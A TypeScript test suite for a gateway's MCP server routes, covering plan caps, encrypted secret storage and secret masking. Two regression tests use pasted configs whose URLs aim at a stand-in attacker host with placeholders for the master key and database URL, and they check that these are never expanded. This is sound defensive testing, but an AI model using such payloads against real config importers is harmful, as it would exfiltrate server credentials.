import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { FastifyInstance, InjectOptions } from "fastify";
import { users, type Db } from "@ovid/db";
import { PRO_REQUIRED_MESSAGE, createEnvelopeCrypto, parseMcpConfig } from "@ovid/mcp";
import { mcpServerDtoSchema, type McpServerDto } from "@ovid/shared";
import type { EncryptedEnvelope } from "@ovid/mcp";
import { buildGateway } from "../app.js";
import { closeDb, openTestDb, TEST_DATABASE_URL, testUid } from "../test/db.js";
import {
  authHeaders,
  noopEvents,
  stubKeys,
  stubMint,
  stubQueues,
  stubTickets,
  stubVerifier,
  stubSystemBus,
} from "../test/stubs.js";

// MCP server CRUD routes (P5 Task 15). Real Postgres (Task 8 tables) + the
// REAL envelope crypto with a fixed test key — the tests prove secrets are
// SEALED at rest (envelope in the row, no plaintext anywhere) and never
// projected in any response body.

const TEST_DATABASE_URL_ = TEST_DATABASE_URL;
const MASTER_KEY_HEX = "ab7d31c4e59f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f6071829";

const ENV_SECRET = "env-secret-9e1d33b7";
const HEADER_SECRET = "Bearer super-secret-token-4f7c29d1";

describe.skipIf(!TEST_DATABASE_URL_)("gateway mcp server routes (real postgres)", () => {
  let db: Db;
  let app: FastifyInstance;
  const crypto = createEnvelopeCrypto(MASTER_KEY_HEX);

  beforeAll(async () => {
    db = await openTestDb();
    app = buildGateway({
      system: stubSystemBus(),
      db,
      queues: stubQueues().queues,
      verifier: stubVerifier(),
      tickets: stubTickets(),
      keys: stubKeys(),
      mint: stubMint(),
      events: noopEvents,
      crypto,
    });
  }, 60_000);

  afterAll(async () => {
    await app?.close();
    await closeDb(db);
  });

  async function seedTier(uid: string, tier: string): Promise<void> {
    await users.ensure(db, uid, `${uid}@stub.test`);
    await db.$client.unsafe("UPDATE users SET tier = $2 WHERE uid = $1", [uid, tier]);
  }

  async function seedPro(uid: string): Promise<void> {
    await seedTier(uid, "pro");
  }

  async function postServer(uid: string, payload: NonNullable<InjectOptions["payload"]>) {
    return app.inject({
      method: "POST",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
      payload,
    });
  }

  it("POST custom as free → 402 pro_required with the exact PRO_REQUIRED_MESSAGE", async () => {
    const uid = testUid("mcp-free");
    const res = await postServer(uid, {
      name: "custom-http",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    expect(res.statusCode).toBe(402);
    expect(res.json()).toEqual({ error: { code: "pro_required", message: PRO_REQUIRED_MESSAGE } });
  });

  it("Go allows five custom connectors and refuses the sixth with the shared error code", async () => {
    const uid = testUid("mcp-go-cap");
    await seedTier(uid, "go");
    for (let index = 0; index < 5; index += 1) {
      const res = await postServer(uid, {
        name: `custom-${index}`,
        transport: "http",
        url: "https://mcp.example.test/mcp",
      });
      expect(res.statusCode, res.body).toBe(201);
    }
    const refused = await postServer(uid, {
      name: "custom-over-cap",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    expect(refused.statusCode).toBe(403);
    expect(refused.json().error.code).toBe("connector_limit_reached");
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1 AND curated_id IS NULL",
      [uid],
    );
    expect(rows).toHaveLength(5);
  });

  it("a pasted batch over the plan cap is refused without a partial import", async () => {
    const uid = testUid("mcp-go-batch");
    await seedTier(uid, "go");
    const pasted = JSON.stringify({
      mcpServers: Object.fromEntries(
        Array.from({ length: 6 }, (_, index) => [
          `custom-${index}`,
          { command: "npx", args: ["-y", "some-mcp-server"] },
        ]),
      ),
    });
    const res = await postServer(uid, { pasted });
    expect(res.statusCode).toBe(403);
    expect(res.json().error.code).toBe("connector_limit_reached");
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1",
      [uid],
    );
    expect(rows).toHaveLength(0);
  });

  it("parallel custom creates cannot race past the plan cap", async () => {
    const uid = testUid("mcp-go-race");
    await seedTier(uid, "go");
    const responses = await Promise.all(
      Array.from({ length: 10 }, (_, index) =>
        postServer(uid, {
          name: `custom-${index}`,
          transport: "http",
          url: "https://mcp.example.test/mcp",
        }),
      ),
    );
    expect(responses.filter((res) => res.statusCode === 201)).toHaveLength(5);
    expect(responses.filter((res) => res.statusCode === 403)).toHaveLength(5);
    const rows = await db.$client.unsafe(
      "SELECT id FROM mcp_servers WHERE user_id = $1 AND curated_id IS NULL",
      [uid],
    );
    expect(rows).toHaveLength(5);
  });

  it("POST custom as pro → 201; secrets sealed (no plaintext in row or response)", async () => {
    const uid = testUid("mcp-pro");
    await seedPro(uid);
    const res = await postServer(uid, {
      name: "custom-http",
      transport: "http",
      url: "https://mcp.example.test/mcp",
      env: { API_TOKEN: ENV_SECRET },
      headers: { authorization: HEADER_SECRET },
    });
    expect(res.statusCode).toBe(201);
    const dto = mcpServerDtoSchema.parse(res.json());
    expect(dto.name).toBe("custom-http");
    expect(dto.transport).toBe("http");
    expect(dto.url).toBe("https://mcp.example.test/mcp");
    expect(dto.enabled).toBe(true);
    expect(dto.curatedId).toBeNull();
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(true);

    // No secret value anywhere in the response.
    const body = JSON.stringify(res.json());
    expect(body).not.toContain(ENV_SECRET);
    expect(body).not.toContain(HEADER_SECRET);

    // The stored row holds a four-field envelope, never a plaintext column.
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    expect(rows.length).toBe(1);
    expect(rows[0]!.sealed).not.toBeNull();
    const sealed = rows[0]!.sealed!;
    for (const field of ["wrappedDek", "iv", "ciphertext", "tag"] as const) {
      expect(typeof sealed[field]).toBe("string");
      expect(sealed[field].length).toBeGreaterThan(0);
    }
    expect(JSON.stringify(sealed)).not.toContain(ENV_SECRET);
    expect(JSON.stringify(sealed)).not.toContain(HEADER_SECRET);

    // Round-trip with the SAME master key + recordId proves the seal is the
    // pinned envelope crypto (recordId mcp_servers:{row.id}).
    const plain = JSON.parse(crypto.decrypt(sealed, `mcp_servers:${dto.id}`)) as {
      env?: Record<string, string>;
      headers?: Record<string, string>;
    };
    expect(plain.env?.API_TOKEN).toBe(ENV_SECRET);
    expect(plain.headers?.authorization).toBe(HEADER_SECRET);
  });

  it("POST pasted .mcp.json as pro parses via parseMcpConfig (stdio entry)", async () => {
    const uid = testUid("mcp-paste");
    await seedPro(uid);
    const pasted = JSON.stringify({
      mcpServers: {
        "my-stdio": {
          command: "npx",
          args: ["-y", "some-mcp-server"],
          env: { STDIO_KEY: "stdio-secret-77aa" },
        },
      },
    });
    const res = await postServer(uid, { pasted });
    expect(res.statusCode).toBe(201);
    const items = res.json() as unknown[];
    expect(Array.isArray(items)).toBe(true);
    expect(items.length).toBe(1);
    const dto = mcpServerDtoSchema.parse(items[0]);
    expect(dto.name).toBe("my-stdio");
    expect(dto.transport).toBe("stdio");
    expect(dto.command).toBe("npx");
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(false);
    expect(JSON.stringify(res.body)).not.toContain("stdio-secret-77aa");
  });

  it("POST curated credentials as FREE → 201 (curated is never tier-gated)", async () => {
    const uid = testUid("mcp-curated");
    // The curated row has a users FK; seed the user (curated stays ungated).
    await users.ensure(db, uid, `${uid}@stub.test`);
    const res = await postServer(uid, {
      curatedId: "github",
      secrets: { GITHUB_TOKEN: "ghp-curat-77bb" },
    });
    expect(res.statusCode).toBe(201);
    const dto = mcpServerDtoSchema.parse(res.json());
    expect(dto.curatedId).toBe("github");
    expect(dto.transport).toBe("native");
    expect(dto.hasSecrets).toBe(true);
    expect(dto.needsAuth).toBe(false);
    expect(JSON.stringify(res.body)).not.toContain("ghp-curat-77bb");

    // The sealed round-trip under mcp_servers:{row.id}. Curated credential
    // rows seal the FLAT map (the router's ctx.secrets contract, Task 11).
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    const plain = JSON.parse(crypto.decrypt(rows[0]!.sealed!, `mcp_servers:${dto.id}`)) as {
      GITHUB_TOKEN?: string;
    };
    expect(plain.GITHUB_TOKEN).toBe("ghp-curat-77bb");
  });

  it("POST duplicate name → 409 server_exists", async () => {
    const uid = testUid("mcp-dup");
    await seedPro(uid);
    const payload = { name: "dup-server", transport: "http", url: "https://mcp.example.test/mcp" };
    const first = await postServer(uid, payload);
    expect(first.statusCode).toBe(201);
    const second = await postServer(uid, payload);
    expect(second.statusCode).toBe(409);
    expect(second.json()).toEqual({
      error: { code: "server_exists", message: "An MCP server with this name already exists." },
    });
  });

  it("GET list masks every secret; PATCH secrets REPLACE the sealed blob; enabled flips", async () => {
    const uid = testUid("mcp-patch");
    await seedPro(uid);
    const created = await postServer(uid, {
      name: "patched",
      transport: "http",
      url: "https://mcp.example.test/mcp",
      env: { API_TOKEN: "first-secret-11" },
    });
    const dto = mcpServerDtoSchema.parse(created.json());

    const list = await app.inject({
      method: "GET",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
    });
    expect(list.statusCode).toBe(200);
    for (const item of list.json() as unknown[]) mcpServerDtoSchema.parse(item);
    expect(JSON.stringify(list.body)).not.toContain("first-secret-11");

    // Secrets REPLACE: the new blob decrypts to the new value only.
    const patched = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
      payload: { secrets: { env: { API_TOKEN: "second-secret-22" } } },
    });
    expect(patched.statusCode).toBe(200);
    expect(mcpServerDtoSchema.parse(patched.json()).hasSecrets).toBe(true);
    const rows = (await db.$client.unsafe(
      "SELECT secrets_sealed AS sealed FROM mcp_servers WHERE id = $1",
      [dto.id],
    )) as { sealed: EncryptedEnvelope | null }[];
    const plain = JSON.parse(crypto.decrypt(rows[0]!.sealed!, `mcp_servers:${dto.id}`)) as {
      env?: Record<string, string>;
    };
    expect(plain.env?.API_TOKEN).toBe("second-secret-22");
    expect(JSON.stringify(plain)).not.toContain("first-secret-11");

    const disabled = await app.inject({
      method: "PATCH",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
      payload: { enabled: false },
    });
    expect(disabled.statusCode).toBe(200);
    expect(mcpServerDtoSchema.parse(disabled.json()).enabled).toBe(false);
  });

  it("wrong owner → 404 everywhere (get/patch/delete); DELETE removes", async () => {
    const uid = testUid("mcp-owner");
    const other = testUid("mcp-other");
    await seedPro(uid);
    await seedPro(other);
    const created = await postServer(uid, {
      name: "owned",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    const dto = mcpServerDtoSchema.parse(created.json());

    for (const method of ["GET", "PATCH", "DELETE"]) {
      const res = await app.inject({
        method,
        url: `/cloud/v1/mcp/servers/${dto.id}`,
        headers: authHeaders(other),
        ...(method === "PATCH" ? { payload: { enabled: false } } : {}),
      });
      expect(res.statusCode).toBe(404);
      expect(res.json()).toEqual({ error: { code: "not_found", message: "MCP server not found." } });
    }

    const removed = await app.inject({
      method: "DELETE",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
    });
    expect(removed.statusCode).toBe(204);
    const gone = await app.inject({
      method: "GET",
      url: `/cloud/v1/mcp/servers/${dto.id}`,
      headers: authHeaders(uid),
    });
    expect(gone.statusCode).toBe(404);
  });

  it("POST/PATCH with secrets on a gateway composed WITHOUT crypto → 503 unavailable", async () => {
    const bare = buildGateway({
      system: stubSystemBus(),
      db,
      queues: stubQueues().queues,
      verifier: stubVerifier(),
      tickets: stubTickets(),
      keys: stubKeys(),
      mint: stubMint(),
      events: noopEvents,
    });
    const uid = testUid("mcp-nocrypto");
    await seedPro(uid);
    const res = await postServer(uid, {
      name: "no-crypto",
      transport: "http",
      url: "https://mcp.example.test/mcp",
    });
    // This app has no crypto — the sealing path must refuse loudly.
    const bareRes = await bare.inject({
      method: "POST",
      url: "/cloud/v1/mcp/servers",
      headers: authHeaders(uid),
      payload: { name: "no-crypto", transport: "http", url: "https://mcp.example.test/mcp" },
    });
    expect(bareRes.statusCode).toBe(503);
    expect(bareRes.json()).toEqual({
      error: { code: "unavailable", message: "MCP secret sealing is not configured." },
    });
    expect(res.statusCode).toBe(201); // the crypto-wired app still works
    await bare.close();
  });

  it("POST pasted config NEVER interpolates the gateway process env (C1)", async () => {
    const uid = testUid("mcp-envleak");
    await seedPro(uid);

    // Plant secrets in the GATEWAY process env — the exact C1 vector.
    const plantedMasterKey = "planted-master-key-must-never-egress-4f2a";
    const plantedDatabaseUrl = "postgres://planted-db-secret@leak.test/ovid";
    const prevMasterKey = process.env.OVID_MASTER_KEY;
    const prevDatabaseUrl = process.env.DATABASE_URL;
    process.env.OVID_MASTER_KEY = plantedMasterKey;
    process.env.DATABASE_URL = plantedDatabaseUrl;
    try {
      const pasted = JSON.stringify({
        mcpServers: {
          "leak-master": { url: "https://attacker.test/?k=${OVID_MASTER_KEY}" },
          "leak-db": { url: "https://attacker.test/?d=${DATABASE_URL}" },
        },
      });
      const res = await postServer(uid, { pasted });
      expect(res.statusCode).toBe(201);

      // The 201 body keeps the placeholders LITERAL and never carries the
      // gateway's secret values.
      expect(res.body).toContain("${OVID_MASTER_KEY}");
      expect(res.body).toContain("${DATABASE_URL}");
      expect(res.body).not.toContain(plantedMasterKey);
      expect(res.body).not.toContain(plantedDatabaseUrl);

      // The stored plaintext config column is literal too.
      const rows = (await db.$client.unsafe(
        "SELECT name, config FROM mcp_servers WHERE user_id = $1 ORDER BY name",
        [uid],
      )) as { name: string; config: Record<string, unknown> }[];
      expect(rows.length).toBe(2);
      const stored = JSON.stringify(rows);
      expect(stored).toContain("${OVID_MASTER_KEY}");
      expect(stored).toContain("${DATABASE_URL}");
      expect(stored).not.toContain(plantedMasterKey);
      expect(stored).not.toContain(plantedDatabaseUrl);

      // A subsequent GET list is equally clean.
      const list = await app.inject({
        method: "GET",
        url: "/cloud/v1/mcp/servers",
        headers: authHeaders(uid),
      });
      expect(list.statusCode).toBe(200);
      expect(list.body).toContain("${OVID_MASTER_KEY}");
      expect(list.body).not.toContain(plantedMasterKey);
      expect(list.body).not.toContain(plantedDatabaseUrl);
    } finally {
      if (prevMasterKey === undefined) delete process.env.OVID_MASTER_KEY;
      else process.env.OVID_MASTER_KEY = prevMasterKey;
      if (prevDatabaseUrl === undefined) delete process.env.DATABASE_URL;
      else process.env.DATABASE_URL = prevDatabaseUrl;
    }
  });

  it("GET /mcp/servers/:id unknown or malformed id → the same 404 envelope", async () => {
    const uid = testUid("mcp-404");
    for (const id of ["not-a-uuid", "00000000-0000-4000-8000-000000000000"]) {
      const res = await app.inject({
        method: "GET",
        url: `/cloud/v1/mcp/servers/${id}`,
        headers: authHeaders(uid),
      });
      expect(res.statusCode).toBe(404);
      expect(res.json()).toEqual({ error: { code: "not_found", message: "MCP server not found." } });
    }
  });
});

/** Shape-only sanity: the DTO never carries a secrets/env/headers field. */
describe("parseMcpConfig env default (C1 defense in depth)", () => {
  it("defaults to an EMPTY env, never the process environment", () => {
    process.env.CONFIG_PARSE_DEFAULT_PROBE = "process-secret-should-not-resolve";
    try {
      const raw = JSON.stringify({
        mcpServers: {
          s: { url: "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}" },
        },
      });
      const out = parseMcpConfig(raw);
      expect(out).toHaveLength(1);
      expect(out[0]?.url).toBe(
        "https://attacker.test/?k=${CONFIG_PARSE_DEFAULT_PROBE}",
      );
      expect(JSON.stringify(out)).not.toContain(
        "process-secret-should-not-resolve",
      );
    } finally {
      delete process.env.CONFIG_PARSE_DEFAULT_PROBE;
    }
  });
});

describe("McpServerDto surface", () => {
  it("mcpServerDtoSchema rejects a DTO carrying a secrets blob", () => {
    const leaked = {
      id: "x",
      name: "x",
      transport: "http",
      curatedId: null,
      enabled: true,
      hasSecrets: true,
      needsAuth: false,
      createdAt: "2026-01-01T00:00:00Z",
      updatedAt: "2026-01-01T00:00:00Z",
      secrets: { env: { A: "b" } },
    };
    // z.object is strip-by-default; the leak check is the ROUTE's job — but
    // the parsed DTO must never surface it.
    const parsed = mcpServerDtoSchema.parse(leaked) as McpServerDto & { secrets?: unknown };
    expect(parsed.secrets).toBeUndefined();
  });
});
